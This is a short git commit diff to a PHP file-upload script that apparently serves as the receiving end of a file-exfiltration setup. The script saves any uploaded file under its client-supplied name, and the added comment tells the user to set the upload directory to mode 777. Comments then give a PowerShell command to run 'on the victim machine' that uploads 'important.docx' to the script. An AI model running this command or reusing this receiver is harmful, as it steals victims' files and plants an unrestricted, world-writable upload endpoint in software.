3ed6242ef7e911623edff1a4f00b5f921acc2933
prophecyun <prophecyun@gmail.com>
2023-06-06 21:46:34 +0800

    Update fileupload.php

--- fileupload.php
+++ fileupload.php
@@ -4,6 +4,6 @@ $uploadfile = $uploaddir . $_FILES['file']['name'];
 move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
 ?>
 
-
+// Chmod 777 on uploaddir
 // On the victim machine run the following powershell command. Use full path
 // (New-Object System.Net.WebClient).UploadFile('http://127.0.0.1/upload.php', 'important.docx')
